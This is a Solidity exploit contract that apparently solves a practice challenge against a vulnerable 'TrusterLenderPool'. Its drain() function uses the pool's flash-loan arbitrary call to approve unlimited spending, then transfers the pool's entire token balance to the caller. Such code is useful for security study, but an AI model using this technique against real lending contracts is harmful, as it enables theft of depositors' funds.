// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract AttackTruster {
    IERC20 public immutable token;
    TrusterLenderPool public immutable pool;
    uint256 public constant MAX_INT =
        115792089237316195423570985008687907853269984665640564039457584007913129639935;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function drain() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            MAX_INT
        );

        pool.flashLoan(0, msg.sender, address(token), data);
        token.transferFrom(
            address(pool),
            msg.sender,
            token.balanceOf(address(pool))
        );
    }
}
